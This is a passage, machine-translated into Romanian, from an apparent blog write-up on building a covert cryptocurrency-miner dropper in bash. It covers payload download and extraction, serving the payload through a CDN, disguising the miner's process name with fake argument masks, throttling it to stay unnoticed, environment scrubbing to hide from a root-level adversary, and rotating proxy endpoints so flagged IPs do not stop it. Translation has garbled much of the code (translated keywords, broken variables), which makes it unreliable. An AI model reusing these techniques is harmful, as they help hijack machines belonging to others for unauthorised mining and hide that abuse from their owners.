<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable"> $ c</span>"</span>  -o -z<span class="hljs-string">"<span class="hljs-variable"> $ d</span>"</span>  -o -z<span class="hljs-string">"<span class="hljs-variable"> $ s</span>"</span>  -o -z<span class="hljs-string">"<span class="hljs-variable"> $ p</span>"</span> ]; <span class="hljs-keyword"> atunci</span><span class="hljs-comment"> ## suntem într-o închisoare</span> 
    închisoare = 1
<span class="hljs-keyword">fi</span></code></pre><p> Acum este timpul să descărcăm încărcătura noastră utilă, alegem să acceptăm atât wget cât și curl, știm deja cum să folosim wget cu semnalizări atente, pentru curl este puțin diferit. Trebuie să creăm un fișier de configurare și să înlocuim<code>CURL_HOME</code></p><pre><code class="bash hljs"><span class="hljs-built_in">echo</span><span class="hljs-string">"url = <span class="hljs-variable"> $ uri</span> 
ieșire =<span class="hljs-variable"> $ {name}</span><span class="hljs-variable"> $ {format}</span> 
conectare-timeout = 10
"</span>  &gt; .curlrc
CURL_HOME =<span class="hljs-variable"> $ PWD</span>  bucla -sOL</code></pre><p> Ultimul pas este doar extragerea sarcinii utile</p><pre><code class="bash hljs"><span class="hljs-built_in">type</span> unzip &amp;&gt;/dev/null &amp;&amp;
    format=<span class="hljs-string">".zip"</span> extract=<span class="hljs-string">"unzip -q"</span> ||
        format=<span class="hljs-string">".tar.gz"</span> extract=<span class="hljs-string">"tar xf"</span></code></pre><p> Merită menționat utilizarea unui [CDN] pentru deservirea sarcinii utile. Aici din nou cloudflare la salvare ne scutește de cheltuielile cu lățimea de bandă. Prin simpla redenumire a sarcinii noastre utile comprimate cu un<em> extensie de fișier</em>  acceptat de cloudflare ... devine cache. Cloudflare nu verifică antetele a ceea ce întreține, poate pentru că a face acest lucru la această scară este pur și simplu impracticabil.</p><h2 id="adventures_down_bashland"><a class="header-anchor" href="#adventures_down_bashland"> Aventuri în Bashland</a></h2><p> Bash a fost ales cu presupunerea că este portabil, nu pare prea deplasat și este mai omniprezent în comparație cu alte limbaje de scriptare, cum ar fi perl, rubin sau python. Adevărul este că un binar independent scris în golang sau lua ar fi fost mult mai ușor, cu mai puține bug-uri și mai ușor de întreținut, practic bash a fost cea mai proastă alegere posibilă, în apărarea mea, până când am zgâriat atâtea mâncărimi cu bash , era prea târziu pentru o rescriere și devenea, de asemenea, un pic plictisitor.</p><p>A existat, de asemenea, opțiunea de a utiliza busybox cu semnalizarea timpului de compilare pentru a utiliza toate elementele încorporate (cum ar fi grep și sed), totuși utilizarea elementelor încorporate în acest fel nu permite generarea de locuri de muncă (furculiță) și expune demonul la blocaje potențiale.</p><p> Voi descrie câteva funcții bash aici, cu lista completă disponibilă<a href="\assets/posts/bash_functions.txt"> Aici</a></p><pre><code class="bash hljs"><span class="hljs-comment">## echo a string long $1 of random lowercase chars</span><span class="hljs-function"><span class="hljs-title">rand_string</span></span>() {
    <span class="hljs-built_in">local</span> c=0
    <span class="hljs-keyword">while</span> [ <span class="hljs-variable">$c</span> -lt <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">do</span><span class="hljs-built_in">printf</span><span class="hljs-string">"\x<span class="hljs-subst"> $ (printf '% x' $ ((97 + RANDOM% 25)</span>))"</span> 
        c = $ ((c +<span class="hljs-number">1</span>))
    <span class="hljs-keyword"> Terminat</span>
}</code></pre><p> Folosește<code>RANDOM</code>  variabilă pentru a obține un număr între 97-122 corespunzător unui cod de caractere, printf ar trebui să fie încorporat, nu vrem să ne bifurcăm într-o buclă.</p><pre><code class="bash hljs"><span class="hljs-comment">## make a new file descriptor named $1</span><span class="hljs-function"><span class="hljs-title">newfd</span></span>() {
    <span class="hljs-built_in">eval</span><span class="hljs-string">"local fd=\${<span class="hljs-variable"> 1 $</span>}"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"exec <span class="hljs-variable"> $ fd</span>&gt;&amp;-"</span>  &amp;&gt; / dev / null
    <span class="hljs-built_in"> local</span>  pp =<span class="hljs-string">".<span class="hljs-subst"> $ (rand_string 8)</span>"</span> 
    mkfifo<span class="hljs-variable"> $ pp</span><span class="hljs-built_in"> dezactivat</span><span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"exec {<span class="hljs-variable"> 1 $</span>}&lt;&gt;<span class="hljs-variable"> $ pp</span>"</span><span class="hljs-comment"> # deconectați conducta numită</span> 
    rm -f<span class="hljs-variable"> $ pp</span>
}</code></pre><p> Utilizați conductele pentru a crea descriptori de fișiere anonimi, aceștia nu se comportă exact ca descriptorii de fișiere, dar sunt suficient de buni pentru<a href="https://en.wikipedia.org/wiki/Inter-process_communication"> IPC</a>.</p><pre><code class="bash hljs"><span class="hljs-comment">## https://unix.stackexchange.com/a/407383/163931</span><span class="hljs-function"><span class="hljs-title">fleep</span></span>()
{
    <span class="hljs-comment"># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class="hljs-string">"<span class="hljs-variable"> $ {_ snore_fd}</span>"</span>  -A<span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span>  ! = 0] ||
        newfd _snore_fd
    <span class="hljs-comment"> # log "fleep: începe să aștepți cu $ {_ snore_fd}"</span><span class="hljs-keyword"> dacă</span> ! <span class="hljs-built_in"> comanda</span> &gt;&amp;<span class="hljs-variable"> $ {_ snore_fd}</span>; <span class="hljs-keyword"> atunci</span> 
        newfd _snore_fd
    <span class="hljs-keyword">fi</span><span class="hljs-built_in"> citit</span>  -t<span class="hljs-variable"> $ {1: -1}</span>  -u<span class="hljs-variable"> $ _snore_fd</span><span class="hljs-comment"> # log "fleep: ended"</span>
}</code></pre><p> Dormit fără furculiță, abuzând de funcționalitatea de expirare a integrării citite, folosește un descriptor de fișiere dedicat și trebuie să ne asigurăm că este disponibil pentru a evita terminarea.</p><p> Există funcții precum<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code>  sunt utilizate pentru a monitoriza utilizarea sistemului, toate folosind Linux<code>/proc</code>  fișiere fără instrumente precum<code>ps</code> , deci fără furculiție, totul pur și simplu bash.</p><pre><code class="bash hljs"><span class="hljs-function"><span class="hljs-title">start_coproc</span></span>() {
    <span class="hljs-built_in">local</span><span class="hljs-built_in">unset</span><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span> = <span class="hljs-built_in"> exec</span> ]; <span class="hljs-keyword"> atunci</span> 
            coproc_name =<span class="hljs-string">"<span class="hljs-variable"> 2 USD</span>"</span><span class="hljs-keyword"> altceva</span> 
            coproc_name =<span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> dacă</span>  [-n<span class="hljs-string">"<span class="hljs-variable"> $ UNSET_COPROC_VARS</span>"</span> ]; <span class="hljs-keyword"> atunci</span><span class="hljs-built_in"> dezactivat</span>=<span class="hljs-string">"unset <span class="hljs-variable"> $ UNSET_COPROC_VARS</span>;"</span><span class="hljs-keyword">fi</span><span class="hljs-built_in"> Buturuga</span><span class="hljs-string">"starting coproc <span class="hljs-variable"> $ coproc_name</span>"</span><span class="hljs-built_in"> dezactivat</span>  -v<span class="hljs-string">"<span class="hljs-variable"> $ coproc_name</span>"</span><span class="hljs-comment"> ## numai variabila, nu funcțiile</span><span class="hljs-built_in">eval</span><span class="hljs-string">"coproc <span class="hljs-variable"> $ coproc_name</span> { <span class="hljs-variable"> $ nesetat</span> $*; }"</span><span class="hljs-comment"> # 2&gt; / dev / null</span><span class="hljs-built_in"> dezactivat</span>  UNSET_COPROC_VARS
        wait_coproc<span class="hljs-string">"<span class="hljs-variable"> $ coproc_name</span>"</span> 3 &amp;&amp; <span class="hljs-built_in"> pauză</span><span class="hljs-keyword"> Terminat</span>
}
<span class="hljs-function"><span class="hljs-title"> stop_coproc</span></span>() {
    <span class="hljs-comment"> ## ștergeți fds</span> 
    id_coproc<span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span>  &amp;&amp; [-n<span class="hljs-string">"<span class="hljs-variable"> $ job_n</span>"</span> ] &amp;&amp; <span class="hljs-built_in">eval</span><span class="hljs-string">"kill -<span class="hljs-variable"> {2: -9} $</span> %<span class="hljs-variable"> $ job_n</span>"</span> ||
        { <span class="hljs-built_in">eval</span><span class="hljs-string">"kill -<span class="hljs-variable"> {2: -9} $</span> \${<span class="hljs-variable"> {1} $</span> _PID} "</span>; } ||
        { <span class="hljs-built_in"> Buturuga</span><span class="hljs-string">"could not kill the specified coprocess with job <span class="hljs-variable"> $ job_n</span>"</span> &amp;&amp; <span class="hljs-built_in"> întoarcere</span> 1; }
}</code></pre><p> Coprocesele sunt disponibile de la bash<code>v4</code> , sunt ca niște joburi, cu excepția faptului că au un nume și proprii descriptori de fișiere.</p><pre><code class="bash hljs"><span class="hljs-comment">## clear file descriptors</span><span class="hljs-function"><span class="hljs-title">clear_fds</span></span>() {
    <span class="hljs-built_in">local</span> fd
    <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> $(compgen -G <span class="hljs-string">"/proc/<span class="hljs-variable"> $ BASHPID</span> / fd / * "</span>); <span class="hljs-keyword"> do</span> 
        fd =<span class="hljs-variable"> $ {fd / * \ /}</span><span class="hljs-keyword"> dacă</span> [[ ! <span class="hljs-string">" $* "</span> =~ <span class="hljs-string">" <span class="hljs-variable"> $ {fd}</span> "</span> ]]; <span class="hljs-keyword"> atunci</span><span class="hljs-keyword"> caz</span><span class="hljs-string">"<span class="hljs-variable"> $ fd</span>"</span><span class="hljs-keyword"> în</span>
                    0|1|2|255|<span class="hljs-string">"<span class="hljs-variable"> $ _snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class="hljs-built_in">eval</span><span class="hljs-string">"exec <span class="hljs-variable"> $ fd</span>&gt;&amp;-"</span>
                        ;;
                <span class="hljs-keyword"> esac</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Terminat</span>
}</code></pre><p> Scriem un daemon, care este un proces de lungă durată și folosim mulți descriptori de fișiere, ne dorim cu adevărat să facem câteva curățări pentru a evita apariția în<a href="https://web.archive.org/web/https://linux.die.net/man/5/limits.conf"> ulimits</a>.</p><pre><code class="bash hljs"><span class="hljs-comment">## queries ipinfo and gets the current ip and country/region</span><span class="hljs-function"><span class="hljs-title">parse_ip</span></span> ()
{
    <span class="hljs-built_in">export</span> ip country region;
    [ ! -e cfg/geoip.json ] &amp;&amp; <span class="hljs-built_in">log</span><span class="hljs-string">"geolocation codes file not found."</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class="hljs-string">"<span class="hljs-variable"> $ ipquery</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Buturuga</span><span class="hljs-string">"failed querying ipinfo"</span> &amp;&amp; <span class="hljs-built_in"> întoarcere</span> 1;
    before_after <span class="hljs-string"> 'ip \ ": \"'</span><span class="hljs-string">"<span class="hljs-variable"> $ ipquery</span>"</span><span class="hljs-string">'\"'</span> ;
    ip = $ (<span class="hljs-built_in"> ecou</span><span class="hljs-variable"> $ după</span> );
    [-z<span class="hljs-string">"<span class="hljs-variable"> $ ip</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Buturuga</span><span class="hljs-string">"failed parsing ipinfo data ip"</span> &amp;&amp; <span class="hljs-built_in"> întoarcere</span> 1;
    before_after <span class="hljs-string"> 'țară\": \"'</span><span class="hljs-string">"<span class="hljs-variable"> $ ipquery</span>"</span><span class="hljs-string">'\"'</span> ;
    tara = $ (<span class="hljs-built_in"> ecou</span><span class="hljs-variable"> $ {după ,,}</span> );
    [-z<span class="hljs-string">"<span class="hljs-variable"> $ tara</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Buturuga</span><span class="hljs-string">"failed parsing ipinfo data country"</span> &amp;&amp; <span class="hljs-built_in"> întoarcere</span> 1;
    <span class="hljs-keyword"> in timp ce</span><span class="hljs-built_in"> citit</span>  l;<span class="hljs-keyword"> do</span><span class="hljs-keyword"> dacă</span> [ <span class="hljs-string">"<span class="hljs-variable"> $ {l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> $ {l / \ ": {}</span>"</span> ]; <span class="hljs-keyword"> atunci</span> 
            înainte după<span class="hljs-string">'"'</span><span class="hljs-string">"<span class="hljs-variable"> $ l</span>"</span><span class="hljs-string">'"'</span> ;
            lastregion = $ (<span class="hljs-built_in"> ecou</span><span class="hljs-variable"> $ după</span>);
        <span class="hljs-keyword"> altceva</span><span class="hljs-keyword"> dacă</span> [ <span class="hljs-string">"<span class="hljs-variable"> $ {l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> $ {l / \ "<span class="hljs-variable"> $ {country}</span>\"}</span>"</span> ]; <span class="hljs-keyword"> atunci</span> 
                regiune =<span class="hljs-variable"> $ ultima regiune</span>;
                <span class="hljs-built_in"> pauză</span>;
            <span class="hljs-keyword">fi</span>;
        <span class="hljs-keyword">fi</span>;
    <span class="hljs-keyword"> Terminat</span>  &lt;cfg / geoip.json
}</code></pre><p> Această funcție se bazează pe<a href="https://ipinfo.io/"> ipinfo</a>  pentru a determina regiunea lucrătorului, care permite reglarea unei logici dependente de regiune,<a href="\assets/posts/geoip.json"> geoip.json</a>  grupează țările în regiuni, deoarece dorim regiunea de nivel superior și nu suntem interesați de țara specifică.</p><pre><code class="bash hljs"><span class="hljs-comment"># try to open a connection to host $1 with port $2 and output to $3</span><span class="hljs-function"><span class="hljs-title">open_connection</span></span>() {
    <span class="hljs-built_in">exec</span> {socket}&lt;&gt;/dev/tcp/<span class="hljs-variable">${1}</span>/<span class="hljs-variable">${2}</span> 2&gt;/dev/null
    <span class="hljs-built_in">echo</span><span class="hljs-variable">$socket</span> &gt;&amp;<span class="hljs-variable">${3}</span>
}

<span class="hljs-comment">## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class="hljs-function"><span class="hljs-title">check_connection</span></span>() {
    <span class="hljs-built_in">local</span> host=<span class="hljs-variable">$1</span> port=<span class="hljs-variable">$2</span> conn_socket=
    [ -z <span class="hljs-string">"<span class="hljs-variable"> $ gazdă</span>"</span> ] &amp;&amp; { <span class="hljs-built_in"> ecou</span><span class="hljs-string"> „nu s-a furnizat gazdă”</span>; <span class="hljs-built_in"> întoarcere</span> 1; }
    [ -z <span class="hljs-string">"<span class="hljs-variable"> $ port</span>"</span> ] &amp;&amp; { <span class="hljs-built_in"> ecou</span><span class="hljs-string"> „fără port furnizat”</span>; <span class="hljs-built_in"> întoarcere</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class="hljs-variable"> $ gazdă</span><span class="hljs-variable"> $ port</span><span class="hljs-variable"> $ conn_socket</span><span class="hljs-comment"> # citiți fd-ul conexiunii deschise din conn_socket fd și închideți-l</span> 
    read_fd<span class="hljs-variable"> $ conn_socket</span>  avl -
    <span class="hljs-keyword"> dacă</span>  [-n<span class="hljs-string">"<span class="hljs-variable"> $ avl</span>"</span> ]; <span class="hljs-keyword"> atunci</span><span class="hljs-comment"> # conexiune strânsă</span><span class="hljs-built_in">eval</span><span class="hljs-string">"exec <span class="hljs-variable"> $ {avl}</span>&lt;&amp;-"</span>  &amp;&gt; / dev / null
        <span class="hljs-built_in"> întoarcere</span> 0 <span class="hljs-comment"> ## conexiunea poate fi stabilită</span><span class="hljs-keyword"> altceva</span><span class="hljs-built_in"> întoarcere</span> 1 <span class="hljs-comment"> ## conexiunea nu poate fi stabilită</span><span class="hljs-keyword">fi</span>
}</code></pre><p> Bash are suport pentru conexiunile tcp, având o abstracție terminată<code>/dev/tcp</code>  (de asemenea, pentru udp, dar majoritatea pare a fi dezactivat de obicei la momentul construirii, deci nu vă puteți baza pe acesta). Aceste fișiere sunt un lucru bash, nu fac parte din Linux<code>/dev</code>  copac.</p><p>Merită menționat și un sistem de blocare pentru a gestiona concurența între lucrările bash. Pentru a permite mai multor lucrări să funcționeze cu încuietori, toți trebuie să partajeze un descriptor de fișiere, deci<code>locker</code>  care este, de asemenea, un loc de muncă, trebuie să înceapă înainte de alte locuri de muncă care doresc să folosească încuietoarea. Vestiarul citește pur și simplu<code>stdin</code>  așteptând cererile de blocare, răspunzând la<code>stdout</code>  în funcție de starea booleană curentă stocată într-o variabilă. Nu garantez că această abordare este liberă de curse, dar pare să funcționeze decent, pe de altă parte, am găsit că descriptorii de fișiere nu sunt foarte fiabili, deoarece bănuiesc că există unele tampoane care nu sunt spălate undeva în jos<em> conducte</em>  și în cele din urmă lovirea blocajelor (ceea ce înseamnă că nu vă puteți baza pe dulapul care vă oferă un răspuns tot timpul).</p><pre><code class="bash hljs"><span class="hljs-comment">## unset bash env apart excluded vars/funcs</span><span class="hljs-function"><span class="hljs-title">clear_env</span></span>(){
    <span class="hljs-built_in">local</span><span class="hljs-built_in">functions</span>=$(<span class="hljs-built_in">declare</span> -F)
    <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions//declare -f }</span><span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span><span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/$u[[:space:]]}</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u}</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u[[:space:]]}</span><span class="hljs-keyword">done</span><span class="hljs-built_in">local</span> vars=$(<span class="hljs-built_in">set</span> -o posix; <span class="hljs-built_in">set</span> | <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-built_in">echo</span><span class="hljs-variable">${l/=*}</span>; <span class="hljs-keyword">done</span>)
    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span><span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span>
        vars=<span class="hljs-variable">${vars/$u[[:space:]]}</span>
        vars=<span class="hljs-variable">${vars/[[:space]]$u}</span>
        vars=<span class="hljs-variable">${vars/[[:space:]]$u[[:space:]]}</span><span class="hljs-keyword">done</span><span class="hljs-built_in">unset</span> -f <span class="hljs-variable">$functions</span> &amp;&gt;/dev/null
    <span class="hljs-built_in">unset</span> -v <span class="hljs-variable">$vars</span> &amp;&gt;/dev/null
    <span class="hljs-comment"># unset $vars &amp;&gt;/dev/null</span>
}

<span class="hljs-comment">## unexport most variables</span><span class="hljs-function"><span class="hljs-title">dex_env</span></span>() {
    exported=$(<span class="hljs-built_in">export</span> -p)
    <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> e; <span class="hljs-keyword">do</span>
        n=<span class="hljs-variable">${e/declare -*x }</span>
        [ <span class="hljs-string">"<span class="hljs-variable"> $ n</span>"</span> = <span class="hljs-string">"<span class="hljs-variable"> $ e</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> continua</span><span class="hljs-comment"> ## multiline var</span>
        n=<span class="hljs-variable"> $ {n / = *}</span><span class="hljs-keyword"> caz</span><span class="hljs-string">"<span class="hljs-variable"> $ n</span>"</span><span class="hljs-keyword"> în</span><span class="hljs-string">"SHELL"</span>|<span class="hljs-string">"USER"</span>|<span class="hljs-string">"HOME"</span>|<span class="hljs-string">"TMUX"</span>|<span class="hljs-string">"CHARSET"</span>|<span class="hljs-string">"TERM"</span>)
                <span class="hljs-built_in"> continua</span> 
                ;;
            *)
                dexportat =<span class="hljs-string">"<span class="hljs-variable"> $ dexportat</span><span class="hljs-variable"> $ {n / = *}</span>"</span><span class="hljs-keyword"> esac</span><span class="hljs-keyword"> Terminat</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-variable"> $ exportat</span>"</span><span class="hljs-built_in"> export</span>  -n<span class="hljs-variable"> $ dexportat</span>
}</code></pre><p> Curățați-vă gunoiul ... programele complexe bash ajung să folosească multe variabile, iar dacă abuzați de spațiul global, acesta devine umflat. Dacă generați locuri de muncă în coajă, acestea moștenesc tot mediul (care este efectiv duplicat, nu partajat), puteți ajunge rapid la mâncare bash<code>100M</code>  de memorie, nu frumos. De asemenea, ne dorim cu adevărat să avem un profil redus. În scenariul nostru de desfășurare, adversarul<sup id="fnref:adversary"><a class="fnref" href="#fndef:adversary">[1]</a></sup>  poate avea acces root și informații complete despre procesele noastre<sup id="fnref:infoproc"><a class="fnref" href="#fndef:infoproc">[2]</a></sup>  , și știți ... fiecare proces conține informații despre comanda completă care a pornit-o și despre variabilele de mediu exportate.</p><h2 id="configuration"><a class="header-anchor" href="#configuration"> Configurare</a></h2><p>Odată ce avem mediul și instrumentele noastre, trebuie să ne reglăm minerul pentru mașina pe care rulează, pași de configurare în pseudo-cod:</p><ul><li><p> numele procesului pentru miner</p></li><li><p> informații despre gazdă (ram / nuclee / cache /<code>ENV_VARS</code>)</p></li><li><p> versiunea de configurare</p></li><li><p><code>worker_id</code>  pentru miner (de pe ip și gazdă)</p></li><li><p> ip / port pentru conexiune</p></li></ul><p> Alegerea unui nume pentru proces este necesară<em> ascunde</em>  faptul că conducem un miner, dar nu doar că ne redenumim binele, avem o listă de<strong> măști</strong>  pentru candidații potențiali (un fișier text simplu în care fiecare linie este o mască):</p><ul><li><p> alege o mască la întâmplare</p></li><li><p> amestecați elementele din coada șirului (toate cu excepția primei) pentru a obține o comandă de proces diversă. Acum avem un șir care arată<code>cmd --arg2 --arg1 --arg3</code> . Aceasta este masca noastră de miner, rulăm binarul<em> fără</em>  argumente, dar se pare că am început o comandă<code>cmd</code>  cu argumente<code>--arg1 --arg2 --arg3</code> . Spațiile și liniuțele sunt permise în numele fișierelor, deci este bine să rulați un binar numit astfel, nu pare că Linux discernă între executabil și argumente atunci când stocați comenzile procesului.</p><p> Configurația minerului este încărcată automat din<code>$PWD</code>.</p></li></ul><h3 id="hashrate"><a class="header-anchor" href="#hashrate"> Hashrate</a></h3><p> , cu timpul, minerul din amonte a obținut multe<strong> reglare automată</strong>  caracteristici, așa că a făcut parte din scripturile mele redundante, dar diferența dintre amonte și aval este că obiectivul din amonte este de a maximiza<em> performanţă</em> , în timp ce obiectivul nostru este să maximizăm<em> eficiență și ofuscare</em> , nu vrem să depășim sistemul, vrem să lipim un pic fără întreruperea serviciului.<sup id="fnref:monerominer"><a class="fnref" href="#fndef:monerominer">[3]</a></sup></p><p> Pentru aceasta, avem nevoie de o înțelegere mai detaliată a mediului, a<code>l2/l3</code>  structura cache a procesorului, ramului și nucleelor ​​și procesorului curent<em> in medie</em>  încărcare și cpu<em> utilizare</em>. Am încercat să construiesc un<a href="https://en.wikipedia.org/wiki/Finite-state_machine"> mașină de stat</a>  în bash care ar începe de la minim și ar încerca diferite configurații stabilindu-se încet pe cel mai bun mediu. A fost o<strong> imens</strong>  risipă de efort plin de<a href="https://en.wikipedia.org/wiki/Technical_debt"> datorii tehnice</a>  care a dat faliment foarte repede și a fost în mare parte aruncat, cu doar rămășițe persistând în baza de cod.</p><p> Frack tot acest jumbo de reglare automată, tocmai l-am făcut pe miner să doarmă în funcție de utilizarea / încărcarea gazdei, acest lucru a necesitat modificări ale minerului<code>sleep</code>  între fire produce randamente și câteva remedieri la câinele de pază al configurației<sup id="fnref:configwatch"><a class="fnref" href="#fndef:configwatch">[4]</a></sup> , ceea ce ne-ar permite să reîncărcăm cantitatea de dormit în timpul rulării. Logica este mult mai simplificată și arată astfel:</p><ul><li><p> dacă utilizarea este peste / sub $ TARGET_USAGE (± marja de eroare) crește / micșorează somnul</p></li><li><p> dacă încărcarea medie în interior<code>1m</code>  este peste / sub $ TARGET_LOAD pauză / reluare minerit</p></li></ul><h3 id="connection"><a class="header-anchor" href="#connection"> Conexiune</a></h3><p> În rezumatul nostru bash am arătat utilități pentru conexiune. De ce avem nevoie de acestea? Pentru că avem nevoie de diversitate; pur și simplu codificarea dură a unui punct final în configurație nu va dura mult, când ceva pare suspect și are activitate de rețea, IP-urile sunt semnalate.</p><p> La început, am experimentat cu câteva metode:</p><ul><li><p> folosind<a href="https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains"> proxychains</a>  pentru a supraîncărca apelurile de rețea ale minerilor, dar a fost necesar ca minerul să fie construit cu biblioteci dinamice și trebuia să le expediați cu sarcina utilă, deci nu era practic.</p></li><li><p> rulează un<a href="https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost"> tunel înainte</a>  cot la cot cu minerul: aceasta avea o mulțime de configurații, deoarece acum configuram două procese pe fiecare implementare, ceea ce însemna mai multe bug-uri.</p></li></ul><p>La sfârșit ne-am stabilit cu doar livrarea unei liste de puncte finale, stocate într-o variabilă bash, alegând una la întâmplare. Conexiunile au fost desigur criptate. Care sunt aceste obiective finale? Expeditori către proxy care s-ar ocupa de joburile minerilor.</p><img alt="" src="/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png"/><p> De ce avem nevoie de un<a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy"> proxy minier</a> ? Nu am trecut niciodată cu adevărat de ~ 100 de conexiuni simultane, așa că un proxy nu a fost cu adevărat necesar pentru încărcarea rețelei, dar a fost convenabil pentru negocierea algoritmului de hash și pentru a oferi diferite ținte de dificultate diferiților mineri, pentru a împiedica minerii să lucreze la<strong> dificultate</strong>  ținte care le-ar lua prea mult timp pentru a finaliza și pentru a evita riscul de a irosi calculele în locuri de muncă neterminate.<sup id="fnref:difficulty"><a class="fnref" href="#fndef:difficulty">[5]</a></sup>  Software-ul pool-ului a necesitat, de asemenea, câteva modificări, deoarece publicitatea era fericită să fie un proxy pentru cereri http simple ...<em> care a trebuit să fie expirat</em> , și o furcă a adăugat controlul accesului, așa că ne-am bazat modificările pe acest lucru.<sup id="fnref:stratumprotocol"><a class="fnref" href="#fndef:stratumprotocol">[6]</a></sup></p><h3 id="editing_json"><a class="header-anchor" href="#editing_json"> Editarea json</a></h3><p> Aplicând modificări la un fișier json cu doar bash am reușit cu o anumită substituție env var și unele regex. Initial ne bazam pe un<code>envsubst</code>  binar pentru a aplica variabile, apoi am mers complet bash<sup id="fnref:fullbash"><a class="fnref" href="#fndef:fullbash">[7]</a></sup>  cu această logică:</p><ul><li><p> citiți șablonul de configurare</p></li><li><p> înlocuiți toate ghilimelele cu un șir foarte ezoteric (cum ar fi<code>_#_#</code>)</p></li><li><p><code>eval</code>  șablonul</p></li><li><p> înlocuiți toate aparițiile ezoterice înapoi cu ghilimele</p></li></ul><p> În afară de evitarea proceselor secundare, un alt avantaj este că obținem capabilități complete de bash în șabloanele noastre. Pentru citire și scriere fără șabloane, trebuie să ne bazăm pe capacitățile de regex bash:</p><pre><code class="bash hljs">cc_rgx=<span class="hljs-string">'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class="hljs-function"><span class="hljs-title">change_config</span></span>() {
	<span class="hljs-built_in">local</span> subs
	<span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable"> $ {l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> $ {l / \ "* $ 1 * \" *: /}</span>"</span> ]; <span class="hljs-keyword"> atunci</span>
			[[ <span class="hljs-string">"<span class="hljs-variable"> $ {l}</span>"</span> =~ <span class="hljs-variable"> $ cc_rgx</span>  ]]
meciuri = (<span class="hljs-string">"<span class="hljs-variable"> $ {BASH_REMATCH [@]}</span>"</span> )
[-n<span class="hljs-string">"<span class="hljs-variable"> $ {potriviri [3]}</span>"</span>  -A<span class="hljs-string">"<span class="hljs-variable"> $ {2: 0: 1}</span>"</span> != <span class="hljs-string">"\""</span>  ] &amp;&amp;
subs =<span class="hljs-string">"\"<span class="hljs-variable"> 2 USD</span>\""</span>  ||
subs =<span class="hljs-string">"<span class="hljs-variable"> 2 USD</span>"</span> 
CONFIG =<span class="hljs-variable"> $ {CONFIG /<span class="hljs-variable"> $ {potriviri [0]}</span>/<span class="hljs-variable"> $ {potriviri [1]}</span>$ subs<span class="hljs-variable"> $ {potriviri [5]}</span>}</span><span class="hljs-built_in"> pauză</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Terminat</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-subst"> $ (printf '% s'<span class="hljs-string">"<span class="hljs-variable"> $ CONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}

<span class="hljs-comment"> ## valoarea de configurare a minerului de ieșire 1 $ necitatat</span> 
gc_rgx =<span class="hljs-string"> '* "[^:] +" *: * ("(. *?)" | ([^,] *)) * (, |. *? \ / \ /.*? | \ n | $)'</span><span class="hljs-function"><span class="hljs-title"> get_config</span></span>() {
	<span class="hljs-keyword"> in timp ce</span><span class="hljs-built_in"> citit</span>  l;<span class="hljs-keyword"> do</span><span class="hljs-keyword"> dacă</span> [ <span class="hljs-string">"<span class="hljs-variable"> $ {l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> $ {l / \ "* $ 1 * \" *: /}</span>"</span> ]; <span class="hljs-keyword"> atunci</span>
			[[ <span class="hljs-string">"<span class="hljs-variable"> $ {l}</span>"</span> =~ <span class="hljs-variable"> $ gc_rgx</span>  ]]
[-n<span class="hljs-string">"<span class="hljs-variable"> $ {BASH_REMATCH [2]}</span>"</span> ] &amp;&amp;
				<span class="hljs-built_in"> printf</span><span class="hljs-string"> „% s”</span><span class="hljs-string">"<span class="hljs-variable"> $ {BASH_REMATCH [2]}</span>"</span> ||
